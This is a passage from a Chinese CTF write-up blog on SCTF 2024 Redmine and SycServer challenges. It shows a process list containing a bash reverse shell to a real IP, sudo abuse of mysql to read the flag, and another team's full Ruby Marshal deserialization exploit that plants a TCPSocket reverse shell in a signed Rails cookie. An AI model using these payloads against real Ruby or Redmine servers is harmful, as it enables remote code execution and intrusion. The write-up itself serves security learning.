<p><img src="/blog/2024/09/28/SCTF-2024/image-20240929015517727.png" alt="image-20240929015517727"></p>
<p>接下来想到第二个hint，意识到这个账密登录的不是我们的目标数据库</p>
<p>观察一下进程</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@4c8bda94f06b:/usr/share/redmine$ <span class="token function">ps</span> <span class="token parameter variable">-ef</span>
<span class="token environment constant">UID</span>          PID    <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMD
root           <span class="token number">1</span>       <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">16</span>:28 pts/0    00:00:00 /bin/sh /usr/sbin/apachectl start
root          <span class="token number">11</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:28 pts/0    00:00:01 /usr/sbin/apache2 <span class="token parameter variable">-DFOREGROUND</span> <span class="token parameter variable">-k</span> start
root          <span class="token number">37</span>      <span class="token number">11</span>  <span class="token number">0</span> <span class="token number">16</span>:28 ?        00:00:00 Passenger watchdog
root          <span class="token number">40</span>      <span class="token number">37</span>  <span class="token number">0</span> <span class="token number">16</span>:28 ?        00:00:09 Passenger core
root         <span class="token number">170</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:28 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
mysql        <span class="token number">297</span>     <span class="token number">170</span>  <span class="token number">0</span> <span class="token number">16</span>:28 ?        00:00:05 /usr/sbin/mariadbd <span class="token parameter variable">--basedir</span><span class="token operator">=</span>/usr <span class="token parameter variable">--datadir</span><span class="token operator">=</span>/var/lib/mysql --plugin-dir<span class="token operator">=</span>/usr/lib/mysql/plugin <span class="token parameter variable">--user</span><span class="token operator">=</span>mysql --skip-log-error --pid-file<span class="token operator">=</span>/run/mysqld/mysqld.pid <span class="token parameter variable">--socket</span><span class="token operator">=</span>/run/mysqld/mysqld.sock
root         <span class="token number">298</span>     <span class="token number">170</span>  <span class="token number">0</span> <span class="token number">16</span>:28 ?        00:00:00 logger <span class="token parameter variable">-t</span> mysqld <span class="token parameter variable">-p</span> daemon error
root        <span class="token number">3318</span>       <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">18</span>:05 pts/2    00:00:00 <span class="token function">bash</span>
root        <span class="token number">3330</span>    <span class="token number">3318</span>  <span class="token number">0</span> <span class="token number">18</span>:05 pts/2    00:00:00 mysql
www-data    <span class="token number">6859</span>      <span class="token number">11</span>  <span class="token number">0</span> <span class="token number">20</span>:16 pts/0    00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-DFOREGROUND</span> <span class="token parameter variable">-k</span> start
www-data    <span class="token number">7356</span>      <span class="token number">11</span>  <span class="token number">0</span> <span class="token number">20</span>:30 pts/0    00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-DFOREGROUND</span> <span class="token parameter variable">-k</span> start
www-data    <span class="token number">7416</span>      <span class="token number">11</span>  <span class="token number">0</span> <span class="token number">20</span>:32 pts/0    00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-DFOREGROUND</span> <span class="token parameter variable">-k</span> start
www-data    <span class="token number">7417</span>      <span class="token number">11</span>  <span class="token number">0</span> <span class="token number">20</span>:32 pts/0    00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-DFOREGROUND</span> <span class="token parameter variable">-k</span> start
www-data    <span class="token number">7419</span>      <span class="token number">11</span>  <span class="token number">0</span> <span class="token number">20</span>:32 pts/0    00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-DFOREGROUND</span> <span class="token parameter variable">-k</span> start
www-data    <span class="token number">7420</span>      <span class="token number">11</span>  <span class="token number">0</span> <span class="token number">20</span>:32 pts/0    00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-DFOREGROUND</span> <span class="token parameter variable">-k</span> start
www-data    <span class="token number">7422</span>      <span class="token number">11</span>  <span class="token number">0</span> <span class="token number">20</span>:32 pts/0    00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-DFOREGROUND</span> <span class="token parameter variable">-k</span> start
www-data    <span class="token number">7423</span>      <span class="token number">11</span>  <span class="token number">0</span> <span class="token number">20</span>:32 pts/0    00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-DFOREGROUND</span> <span class="token parameter variable">-k</span> start
www-data    <span class="token number">7424</span>      <span class="token number">11</span>  <span class="token number">0</span> <span class="token number">20</span>:32 pts/0    00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-DFOREGROUND</span> <span class="token parameter variable">-k</span> start
www-data   <span class="token number">10450</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">22</span>:35 ?        00:00:00 Passenger RubyApp: /usr/share/redmine <span class="token punctuation">(</span>production<span class="token punctuation">)</span>
www-data   <span class="token number">12589</span>      <span class="token number">11</span>  <span class="token number">0</span> <span class="token number">23</span>:50 pts/0    00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-DFOREGROUND</span> <span class="token parameter variable">-k</span> start
www-data   <span class="token number">12746</span>      <span class="token number">40</span>  <span class="token number">3</span> <span class="token number">23</span>:55 ?        00:00:02 Passenger AppPreloader: /usr/share/redmine
www-data   <span class="token number">12789</span>   <span class="token number">12746</span>  <span class="token number">0</span> <span class="token number">23</span>:55 ?        00:00:00 Passenger RubyApp: /usr/share/redmine <span class="token punctuation">(</span>production<span class="token punctuation">)</span>
www-data   <span class="token number">12829</span>   <span class="token number">10450</span>  <span class="token number">0</span> <span class="token number">23</span>:56 ?        00:00:00 <span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token function">ls</span><span class="token punctuation">;</span><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/115.236.153.177/30908 0>&amp;1'</span>
www-data   <span class="token number">12831</span>   <span class="token number">12829</span>  <span class="token number">0</span> <span class="token number">23</span>:56 ?        00:00:00 <span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/115.236.153.177/30908 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span>
www-data   <span class="token number">12832</span>   <span class="token number">12831</span>  <span class="token number">0</span> <span class="token number">23</span>:56 ?        00:00:00 <span class="token function">bash</span> <span class="token parameter variable">-i</span>
www-data   <span class="token number">12849</span>   <span class="token number">12832</span>  <span class="token number">0</span> <span class="token number">23</span>:56 ?        00:00:00 <span class="token function">ps</span> <span class="token parameter variable">-ef</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>没啥重要的东西</p>
<p><code>ls -lh /var/www/html/static/</code>发现 test 是 www-data 权限，而且没看到test文件的生成方式，读一下历史命令试试（实际上我是grep 翻关键字的时候发现的）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@4c8bda94f06b:/usr/share/redmine$ <span class="token function">cat</span> ./templates/database-mysql.yml.template
plate/templates/database-mysql.yml.temp
production:
  adapter: mysql2
  database: _DBC_DBNAME_
  host: _DBC_DBSERVER_
  port: _DBC_DBPORT_
  username: _DBC_DBUSER_
  password: _DBC_DBPASS_
  encoding: utf8
www-data@4c8bda94f06b:/usr/share/redmine$ <span class="token function">find</span> /var <span class="token parameter variable">-type</span> f <span class="token parameter variable">-exec</span> <span class="token function">grep</span> <span class="token parameter variable">-l</span> <span class="token string">"_DBC_"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> + <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/var/www/.bash_history
www-data@4c8bda94f06b:/usr/share/redmine$ <span class="token function">cat</span> /var/www/.bash_history
<span class="token function">ls</span>
<span class="token builtin class-name">exit</span>
<span class="token function">ls</span>
<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
mysql <span class="token parameter variable">-e</span> <span class="token string">"show databases;"</span>
<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token function">clear</span>
<span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">"show databases"</span><span class="token punctuation">;</span>
<span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">"show databases;"</span>
<span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">"show databases;"</span> <span class="token operator">></span> <span class="token number">2</span>
<span class="token function">ls</span>
<span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">"show databases;"</span> <span class="token operator">></span> ./2.txt
<span class="token function">ls</span>
<span class="token builtin class-name">echo</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token number">2</span>
<span class="token function">ls</span>
<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> <span class="token number">2</span>
<span class="token function">ls</span>
<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> <span class="token number">2</span>
<span class="token function">ls</span>
<span class="token number">1</span>.php
index.html
redmine
test.php
<span class="token function">clear</span>
<span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">"show databases;"</span> <span class="token operator">></span> <span class="token string">"2.txt"</span>
<span class="token function">ls</span>
<span class="token builtin class-name">echo</span> <span class="token environment constant">$SHELL</span>
<span class="token function">whoami</span>
<span class="token function">ls</span> <span class="token parameter variable">-la</span>
<span class="token builtin class-name">cd</span> static
<span class="token function">ls</span>
<span class="token builtin class-name">echo</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span> <span class="token number">2</span>
<span class="token function">ls</span>
<span class="token function">rm</span> <span class="token number">2</span>
<span class="token function">ls</span>
<span class="token function">cat</span> <span class="token builtin class-name">test</span>
<span class="token builtin class-name">exit</span>
<span class="token function">ls</span>
mysql
<span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">"show databases;"</span>
<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现直接用 sudo 执行mysql命令即可</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">"use secret;show tables;select * from flag;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/09/28/SCTF-2024/image-20240929082727253.png" alt="image-20240929082727253"></p>
<hr>
<h2 id="W-amp-M的解法"><a href="#W-amp-M的解法" class="headerlink" title="W&amp;M的解法"></a>W&amp;M的解法</h2><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://devcraft.io/2022/04/04/universal-deserialisation-gadget-for-ruby-2-x-3-x.html">https://devcraft.io/2022/04/04/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</a></p>
<p>看不懂参考文章，感觉也是打反序列化，但是这里用到了自己的服务器</p>
<p>贴一下它们的打法：</p>
<blockquote>
<p>先生成一个带命令的rz文件。放到自己的https oss上。把请求地址放@host的地方</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># Autoload the required classes</span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'uri'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'rails/all'</span></span>
Gem<span class="token double-colon punctuation">::</span>SpecFetcher

<span class="token comment"># create a file a.rz and host it somewhere accessible with https</span>
<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">generate_rz_file</span></span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
  <span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"zlib"</span></span>
  spec <span class="token operator">=</span> Marshal<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>Gem<span class="token double-colon punctuation">::</span><span class="token class-name">Specification</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"bundler"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  out <span class="token operator">=</span> Zlib<span class="token double-colon punctuation">::</span>Deflate<span class="token punctuation">.</span>deflate<span class="token punctuation">(</span> spec <span class="token operator">+</span> <span class="token string-literal"><span class="token string">"\"]\n"</span></span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string-literal"><span class="token string">"\necho ref;exit 0;\n"</span></span><span class="token punctuation">)</span>
  puts out<span class="token punctuation">.</span>inspect

  <span class="token builtin">File</span><span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"a.rz"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"wb"</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>file<span class="token operator">|</span>
    file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create_folder</span></span>
  uri <span class="token operator">=</span> <span class="token constant">URI</span><span class="token double-colon punctuation">::</span><span class="token constant">HTTP</span><span class="token punctuation">.</span>allocate
  uri<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@path"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"/"</span></span><span class="token punctuation">)</span>
  uri<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@scheme"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"s3"</span></span><span class="token punctuation">)</span>
  uri<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@host"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"xxxxxxxx/a10.rz?"</span></span><span class="token punctuation">)</span>  <span class="token comment"># use the https host+path with your rz file</span>

  uri<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@port"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"/../../../../../../../../../../../../../../../tmp/cache/bundler/git/aaa-e1a1d77599bf23fec08e2693f5dd418f77c56301/"</span></span><span class="token punctuation">)</span>
  uri<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@user"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"user"</span></span><span class="token punctuation">)</span>
  uri<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@password"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"password"</span></span><span class="token punctuation">)</span>

  spec <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Source<span class="token punctuation">.</span>allocate
  spec<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@uri"</span></span><span class="token punctuation">,</span> uri<span class="token punctuation">)</span>
  spec<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@update_cache"</span></span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>

  request <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Resolver<span class="token double-colon punctuation">::</span>IndexSpecification<span class="token punctuation">.</span>allocate
  request<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@name"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"name"</span></span><span class="token punctuation">)</span>
  request<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@source"</span></span><span class="token punctuation">,</span> spec<span class="token punctuation">)</span>

  s <span class="token operator">=</span> <span class="token punctuation">[</span>request<span class="token punctuation">]</span>

  r <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>RequestSet<span class="token punctuation">.</span>allocate
  r<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@sorted"</span></span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>

  l <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>RequestSet<span class="token double-colon punctuation">::</span>Lockfile<span class="token punctuation">.</span>allocate
  l<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@set"</span></span><span class="token punctuation">,</span> r<span class="token punctuation">)</span>
  l<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@dependencies"</span></span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

  l
<span class="token keyword">end</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">git_gadget</span></span><span class="token punctuation">(</span>git<span class="token punctuation">,</span> reference<span class="token punctuation">)</span>
  gsg <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Source<span class="token double-colon punctuation">::</span>Git<span class="token punctuation">.</span>allocate
  gsg<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@git"</span></span><span class="token punctuation">,</span> git<span class="token punctuation">)</span>
  gsg<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@reference"</span></span><span class="token punctuation">,</span> reference<span class="token punctuation">)</span>
  gsg<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@root_dir"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"/tmp"</span></span><span class="token punctuation">)</span>
  gsg<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@repository"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"vakzz"</span></span><span class="token punctuation">)</span>
  gsg<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@name"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"aaa"</span></span><span class="token punctuation">)</span>

  basic_spec <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Resolver<span class="token double-colon punctuation">::</span>Specification<span class="token punctuation">.</span>allocate
  basic_spec<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@name"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"name"</span></span><span class="token punctuation">)</span>
  basic_spec<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@dependencies"</span></span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

  git_spec <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Resolver<span class="token double-colon punctuation">::</span>GitSpecification<span class="token punctuation">.</span>allocate
  git_spec<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@source"</span></span><span class="token punctuation">,</span> gsg<span class="token punctuation">)</span>
  git_spec<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@spec"</span></span><span class="token punctuation">,</span> basic_spec<span class="token punctuation">)</span>

  spec <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Resolver<span class="token double-colon punctuation">::</span>SpecSpecification<span class="token punctuation">.</span>allocate
  spec<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@spec"</span></span><span class="token punctuation">,</span> git_spec<span class="token punctuation">)</span>

  spec
<span class="token keyword">end</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">popen_gadget</span></span>
  spec1 <span class="token operator">=</span> git_gadget<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"tee"</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">in</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"/tmp/cache/bundler/git/aaa-e1a1d77599bf23fec08e2693f5dd418f77c56301/quick/Marshal.4.8/name-.gemspec"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  spec2 <span class="token operator">=</span> git_gadget<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"sh"</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

  s <span class="token operator">=</span> <span class="token punctuation">[</span>spec1<span class="token punctuation">,</span> spec2<span class="token punctuation">]</span>

  r <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>RequestSet<span class="token punctuation">.</span>allocate
  r<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@sorted"</span></span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>

  l <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>RequestSet<span class="token double-colon punctuation">::</span>Lockfile<span class="token punctuation">.</span>allocate
  l<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@set"</span></span><span class="token punctuation">,</span> r<span class="token punctuation">)</span>
  l<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@dependencies"</span></span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

  l
<span class="token keyword">end</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">to_s_wrapper</span></span><span class="token punctuation">(</span>inner<span class="token punctuation">)</span>
  s <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span><span class="token class-name">Specification</span><span class="token punctuation">.</span><span class="token keyword">new</span>
  s<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@new_platform"</span></span><span class="token punctuation">,</span> inner<span class="token punctuation">)</span>
  s
<span class="token keyword">end</span>

folder_gadget <span class="token operator">=</span> create_folder
exec_gadget <span class="token operator">=</span> popen_gadget
generate_rz_file<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"xxxxx\",\"1337\");while(cmd=c.gets);IO.popen(cmd,\"r\")&#123;|io|c.print io.read&#125;end'"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> Marshal<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">[</span>Gem<span class="token double-colon punctuation">::</span>SpecFetcher<span class="token punctuation">,</span> to_s_wrapper<span class="token punctuation">(</span>folder_gadget<span class="token punctuation">)</span><span class="token punctuation">,</span> to_s_wrapper<span class="token punctuation">(</span>exec_gadget<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#Marshal.load(r)</span>
<span class="token comment">#puts %&#123;Marshal.load(["#&#123;r.unpack("H*")&#125;"].pack("H*"))&#125;</span>
<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">sign_and_encryt_data</span></span><span class="token punctuation">(</span>data<span class="token punctuation">,</span>secret_key_base<span class="token punctuation">)</span>
        salt <span class="token operator">=</span> <span class="token string-literal"><span class="token string">'authenticated encrypted cookie'</span></span>
        encrypted_cookie_cipher<span class="token operator">=</span><span class="token string-literal"><span class="token string">'aes-256-gcm'</span></span>
        serializer<span class="token operator">=</span>ActiveSupport<span class="token double-colon punctuation">::</span>MessageEncryptor<span class="token double-colon punctuation">::</span>NullSerializer
        key_generator<span class="token operator">=</span>ActiveSupport<span class="token double-colon punctuation">::</span><span class="token class-name">KeyGenerator</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>secret_key_base<span class="token punctuation">,</span><span class="token symbol">iterations</span><span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">)</span>
        key_len<span class="token operator">=</span>ActiveSupport<span class="token double-colon punctuation">::</span>MessageEncryptor<span class="token punctuation">.</span>key_len<span class="token punctuation">(</span>encrypted_cookie_cipher<span class="token punctuation">)</span>
        secret<span class="token operator">=</span>key_generator<span class="token punctuation">.</span>generate_key<span class="token punctuation">(</span>salt<span class="token punctuation">,</span>key_len<span class="token punctuation">)</span>
        encryptor<span class="token operator">=</span>ActiveSupport<span class="token double-colon punctuation">::</span><span class="token class-name">MessageEncryptor</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span><span class="token symbol">cipher</span><span class="token operator">:</span> encrypted_cookie_cipher<span class="token punctuation">,</span><span class="token symbol">serializer</span><span class="token operator">:</span> serializer<span class="token punctuation">)</span>
        data<span class="token operator">=</span>encryptor<span class="token punctuation">.</span>encrypt_and_sign<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token constant">CGI</span><span class="token double-colon punctuation">::</span>escape<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">end</span>
puts sign_and_encryt_data<span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token constant">ARGV</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="SycServer2-0（复现）"><a href="#SycServer2-0（复现）" class="headerlink" title="SycServer2.0（复现）"></a>SycServer2.0（复现）</h1><blockquote>
<p>javascript + sql注入 + 原型链污染</p>
</blockquote>
<p>ctrl+u </p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">wafsql</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\-\_\,\!\|\~\`\(\)\#\$\%\^\&amp;\*\&#123;\&#125;\:\;\"\&lt;\>\?\\\/\'\ ]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> value <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">; </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>document<span class="token punctuation">.</span>cookie<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> parts <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">; </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">=</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>parts<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">return</span> parts<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> authToken <span class="token operator">=</span> <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token string">'auth_token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>authToken<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
